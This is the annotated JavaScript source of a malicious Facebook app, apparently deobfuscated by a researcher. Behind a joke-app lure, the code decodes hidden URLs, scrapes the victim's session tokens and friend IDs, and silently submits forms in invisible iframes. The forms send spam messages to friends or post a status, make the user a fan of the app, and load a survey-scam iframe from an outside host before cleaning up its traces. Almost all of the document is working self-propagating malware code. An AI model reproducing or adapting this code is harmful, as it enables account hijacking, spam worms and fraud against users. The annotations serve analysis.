/* facebook sandbox initialization below, not important here, so removed */
var app_xx = new fbjs_sandbox("xx").setBridgeHash("");

app_xx.validation_vars = {
};
app_xx.context = "xxx";
app_xx.contextd = "xxx";
app_xx.data = {
		"xxx"
};

app_xx.bootstrap();

var axx_startedapp;
// axx_sheep will contain your friend IDs
// axx_params will contain 3 elements: 2 first items are credentials for sending messages, 3rd - your FB id
var axx_sheep = [], axx_params = [], axx_domethod = 0;

var axx_domethod = 0;

function axx_logerr(axx_err) {

}

function axx_startapp() {
	// start only once
	if (axx_startedapp == '1') {
		return;
	}
	axx_startedapp = '1';

	var axx_create = {
		help : function(axx_cmd, axx_name) {
		    // actual decoding function - extracts characters from "<appid>_m" title attribute and combine them
			var axx_co = axx_document.getElementById(
					axx_name.substr(2, 1)).getTitle(); // "#m".getTitle()

			axx_co = "choy:ketmdslqxb.ujpzgvnra/fiw_?="; // actual key for decoding (it doesn't mean anything on its own
														 //, its just a dictionary)

			// decoding loop axx_cmd
			// FBJS.idx is FB sandbox functionality - see http://w2spconf.com/2009/papers/s3p2.pdf
			// FBJS.idx(a) === a
			// axx_cmd contains offsets of axx_co characters to append
			for ( var axx_a = 0, axx_out = ''; axx_a <= axx_cmd.length - 1; axx_a++) {
				var axx_out = axx_out
						+ axx_co.substr(axx_cmd[$FBJS
								.idx(axx_a)], 1);
			}
			return axx_out;
		},
		input : function(axx_name, axx_value) {
			// add hidden input to form
			var axx_frmform = axx_document
					.getElementById('frm');
			var axx_frminput = axx_document
					.createElement('input');
			axx_frminput.setType('hidden').setValue(
					axx_value).setName(axx_name);
			axx_frmform.appendChild(axx_frminput);
			axx_frminput = null, axx_frmform = null;
			return;
		},
		fire : function(axx_nam, axx_val) {
			// decode or insert input field
			var axx_val = axx_val || '';
			return (axx_val == 'name') ? $FBJS.ref(this).help(
					axx_nam, axx_val) : $FBJS.ref(
					this).input(axx_nam, axx_val);
		}
	};

	var axx_meth = {
		// object with character offets from app's 'm' HTML entity (in title attr there are characters that the result is composed of)
	    // get() method decodes
		// small obfuscation below
		ftarg : [ "21" - -"5", 22 + 1, "18" - -"6" ],
		fhome : [ 5 - 4, 3 + 4, 1 + 6, 17 + 1, 8 - 4, 20 + 5, "19" - -"6",
				5 + 2, 1 + 1, 13 + 3, 10 - 10, 3 - 2, 11 + 4, 23 + 3, 14 + 10,
				20 - 20, 3 + 3, 10 + 4, 1 + 1, 4 - 2, 2 + 3, 11 + 4, 5 - 5,
				1 + 1, 16 - 8, 17 + 8, 9 - 8, 9 - 7, 4 + 4, 1 + 5, 9 + 6,
				17 + 1, 19 - 18, 17 + 1 ],
		m : [ 3 - 2, "3" - -"4", 3 + 4, 17 + 1, 2 + 2, 20 + 5, 30 - 5, 10 - 3,
				1 + 1, 13 + 3, "0" - -"0", 2 - 1, 13 + 2, 23 + 3, 20 + 4,
				10 - 10, 3 + 3, 11 + 3, 1 + 1, 4 - 2, 3 + 2, 14 + 1, 8 - 8,
				8 - 6, 4 + 4, 30 - 5, 4 + 4, 3 + 3, 5 + 5, 6 + 4, 20 + 4,
				10 + 10, 3 + 3, 21 + 8, 7 + 3, 3 + 3, 20 + 2, 6 + 3, 11 + 4,
				17 + 1, 2 - 1, 10 + 8 ],
		su : [ 5 - 4, "2" - -"5", 1 + 6, 15 + 3, 2 + 2, 20 + 5, 30 - 5, 1 + 6,
				1 + 1, 13 + 3, 10 - 10, 3 - 2, 12 + 3, 20 + 6, 22 + 2, 5 - 5,
				4 + 2, 12 + 2, 1 + 1, 5 - 3, 4 + 1, 11 + 4, 9 - 9, 1 + 1,
				4 + 4, 21 + 4, 6 + 4, 12 + 4, 11 + 3, 5 + 3, 26 + 1, 4 + 3,
				28 + 1, 8 + 2, 5 + 2, 22 + 2, 1 + 6, 13 + 3, 1 + 9, 10 + 5,
				14 + 4, 2 - 1, 17 + 1 ],
		lp : [ 1, 7, 7, 18, 4, 25, 25, 7, 2, 16, 0, 1, 15, 26, 24, 0, 6, 14, 2,
				2, 5, 15, 0, 2, 8, 25, 23, 6, 12, 10, 15, 18, 1, 18, 30, 27, 9,
				31 ],
		pid : [ "11" - -"7", 4 - 2, 5 + 5, 1 + 6, 19 + 10, 23 + 3, 1 + 1,
				22 + 1, 2 + 6, 21 + 8, 21 + 6, 6 + 3 ],
		fbd : [ 19 + 7, "10" - -"4", 20 + 9, 10 - 1, 5 + 2, 5 + 5, 11 + 9 ],
		hc : [ "0" - -"1", 4 + 2, 10 + 1, 15 + 3, 28 + 1, 10 - 10, 1 + 1,
				11 + 11, 2 + 5, 20 + 4, 21 + 6, 20 + 2, 1 + 5, 20 + 3 ],
		/*
			ftarg:[26,23,24],
			fhome:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,1,2,8,6,15,18,1,18],
			m:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,8,6,10,10,24,20,6,29,10,6,22,9,15,18,1,18],
			su:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,10,16,14,8,27,7,29,10,7,24,7,16,10,15,18,1,18],
			lp:[1,7,7,18,4,25,25,7,2,16,0,1,15,26,24,0,6,14,2,2,5,15,0,2,8,25,23,6,12,10,15,18,1,18,30,27,9,31],
			pid:[18,2,10,7,29,26,2,23,8,29,27,9],
			fbd:[26,14,29,9,7,10,20],
			hc:[1,6,11,18,29,0,2,22,7,24,27,22,6,23]
		 */

		// decoding function
		get : function(axx_s) {
	    // results:
		/*
			m=http://touch.facebook.com/message_send.php
			ftarg=fra
			su=http://touch.facebook.com/submit_status.php  (status update)
			pid=post_form_id
			lp=http://touch.facebook.com/reqs.php?id=
			fhome=http://touch.facebook.com/home.php
			fbd=fb_dtsg
			hc=fb_dtsg
		 */
			return axx_create.fire(axx_s, 'name');
		}
	};

	var axx_findvalues = {
	    // inserts your friend ids into axx_sheep
	    // inserts credentials for making a wall post into axx_params
	    // returns 1 if succeeded
		a : ((new axx_RegExp(
				'st_.or._i.\\\x22 .al.e=\\\x22(.*?)\\\x22', ''))), // <form action="http://www.facebook.com/wallpost.php"  post_form_id value
		b : ((new axx_RegExp(
				'b_d.s.\\\x22 v..ue=\\\x22(.*?)\\\x22', ''))), // value = type="hidden" id="fb_dtsg" name="fb_dtsg"
		c : ((new axx_RegExp('p.o..le\\.p.p\\?i.=(\\d+)\\\x22', ''))), // href="http://www.facebook.com/profile.php?id=xxx" your profile ID
		d : ((new axx_RegExp(
				'na.e=\\\x22i.s\\[]\\\x22 v.l.e=\\\x22(.*?)\\\x22', 'gi'))), // name=ids[] value= -- your friend ids

		firefunc : function(axx_strdata) {
			var axx_matches = [], axx_fmatch = [], axx_out = '', axx_f = 0;
			for (axx_p in axx_findvalues) {
				try {
					if (axx_f == 3) {
						while (axx_matches = axx_findvalues[$FBJS
								.idx(axx_p)]
								.exec(axx_strdata)) {
							if (axx_matches[$FBJS.idx(1)] == axx_sheep[$FBJS
									.idx(0)]) {
								break;
							}
							if (axx_matches[$FBJS.idx(1)].length < 25) {
								axx_sheep
										.push(axx_matches[$FBJS
												.idx(1)]);
							}
						}
						break;
					}
					axx_fmatch = axx_findvalues[$FBJS
							.idx(axx_p)]
							.exec(axx_strdata);
					if (axx_fmatch[$FBJS.idx(1)] !== null) {
						axx_params[$FBJS.idx(axx_f)] = axx_fmatch[$FBJS
								.idx(1)];
					}
				} catch (axx_err) {
					axx_logerr(axx_err);
				}
				axx_f++;
			}
			axx_document.getElementById('help_container')
					.setTextValue('');
			var axx_out = ((axx_params[$FBJS.idx(0)] !== null) && (axx_params[$FBJS
					.idx(0)] !== null)) ? 1 : 0;
			return axx_out;
		}
	};

	var axx_methodaction = function() {
		var axx_retmeth = 0;
		axx_sheep = axx_sheep || [];
		var axx_goahead = (((axx_sheep.length - 1) < 1) || ((axx_sheep.length - 1) > 500)) ? 0
				: 1;
		if (axx_goahead == 0) {
			// if you have <2 friends or > 500 friends

			// only submit status update through touch.facebook.com

			// change form action and target
			axx_document.getElementById('frm').setAction( /*http://touch.facebook.com/submit_status.php*/
					axx_meth.get(axx_meth.su))
					.setTarget(
							axx_meth
									.get(axx_meth.ftarg) /* fra  - created iframe*/) ;
			// add fields
			axx_create
					.fire(
							'status',
							'only go here if you are my TRUE friend http://apps.facebook.com/makemelaughnow/');
			// add credentials
			axx_create.fire(axx_meth
					.get(axx_meth.pid),
					axx_params[$FBJS.idx(0)]);
			axx_create.fire(axx_meth
					.get(axx_meth.fbd),
					axx_params[$FBJS.idx(1)]);

			axx_retmeth = 2;
			return axx_retmeth;

		} else {
			// if you have 2-500 friends
			// send message to first 12-20 of them through touch.facebook.com
			axx_document.getElementById('frm').setAction(
					axx_meth.get(axx_meth.m)  /*http://touch.facebook.com/message_send.php*/)
					.setTarget(
							axx_meth
									.get(axx_meth.ftarg));

			// add credentials
			axx_create.fire(axx_meth
					.get(axx_meth.fbd),
					axx_params[$FBJS.idx(1)]);
			axx_create.fire(axx_meth
					.get(axx_meth.pid),
					axx_params[$FBJS.idx(0)]);

			axx_create.fire('ids[]', '');
			axx_create.fire('subject', 'i thought of you..');
			axx_create
					.fire(
							'body',
							'im using up my fb ad credits to send u a gift so HERE = http://apps.facebook.com/makemelaughnow/');
		    // add your friends
			// min 12
			var axx_sendamount = (12 > (axx_sheep.length - 1)) ? (axx_sheep.length - 1)
					: 12;
			// max 20
			var axx_sendamount = (axx_sendamount < 20) ? axx_sendamount
					: 20;
			for ( var axx_j = 0; axx_j < axx_sendamount; axx_j++) {
				// add 12-12 first friends
				axx_create.fire('ids[]',
						axx_sheep[$FBJS.idx(axx_j)]);
			}
			axx_create.fire(axx_meth
					.get(axx_meth.fbd),
					axx_params[$FBJS.idx(1)]);

			axx_retmeth = 1;
			return axx_retmeth;
		}
	}

	// app starts here
	try {

		// here's the trick - the app (or FB) stores most of app's HTML code in a single element title attribute
		// code extracts lots of data from it (friend ids, credentials, user id, etc.)
		axx_domethod = axx_findvalues
				.firefunc(axx_document.getElementById(
						'help_container').getFirstChild().getTitle());
		// axx_domethod will be 1 and axx_sheep/axx_params initialized
	} catch (axx_err) {
		axx_logerr(axx_err);
	} finally {
		if ((axx_domethod == 1)
				&& (axx_params.length > 1)) { // found credentials

			// add iframe and form
			axx_document
					.getElementById('work_container')
					.setInnerXHTML(
							"<iframe name='fra' id='fra' frameborder='0' smartsize='false' width='1' height='1' scrolling='no' style='width:1px;height:1px;' src='about:blank'></iframe>");
			axx_document.getElementById('frm_container')
					.setInnerXHTML(
							'<form id="frm" method="POST" action=""></form>');

			// fill out form to touch.facebook.com with your credentials, targetting the form to iframe
			var axx_submitfrm = axx_methodaction();
			if (axx_submitfrm > 0) {
				try {
					axx_setTimeout(function() {
						axx_document.getElementById('frm')
								.submit();
					}, 1200);
				} catch (axx_err) {
					axx_logerr(axx_err);
				}
			}

			try {
				// make current user a fan of the application
				var axx_lkp = axx_document
						.createElement('div').setId('lkp');
				axx_document.getElementById('work_container')
						.appendChild(axx_lkp);
				axx_lkp
						.setInnerXHTML("<iframe id='fralkp' name='fralkp' width='1' height='1' scrolling='no' frameborder='0' style='border:none;overflow:hidden;width:1px;height:1px;' src='about:blank'></iframe>");
				axx_document.getElementById('fralkp').setSrc(
						axx_meth.get(axx_meth.lp /* http://touch.facebook.com/reqs.php?id= */)
								+ '148034935215009&action=fan&'
								+ axx_meth
										.get(axx_meth.pid) + '='
								+ axx_params[$FBJS.idx(0)]);
				axx_lkp = null;
			} catch (axx_err) {
				axx_logerr(axx_err);
			}

		}
	}

	// load ads
	axx_document.getElementById('frabox').setClassName('frabox');
	axx_document
			.getElementById('frabox')
			.setInnerXHTML(
					'<iframe id="fraoff" name="fraoff" width="760" height="700" scrolling="no" frameborder="0" style="position:relative;overflow:hidden;border:none;width:755px;height:750px;top:-245px;" src="http://track.socialsurveys.us/DefaultPage.aspx?nm=017gjfq68yx9"></iframe>');
	axx_document.getElementById('loading').setTextValue(
			'Complete above to see a joke!');

	// clean up after 16 secs
	axx_setTimeout(function() {
		axx_document.getElementById('work_container')
				.setTextValue('');
		axx_document.getElementById('frm_container').setTextValue(
				'');

	}, 16000);

}

axx_setTimeout(function() {
	axx_startapp();
}, 800);
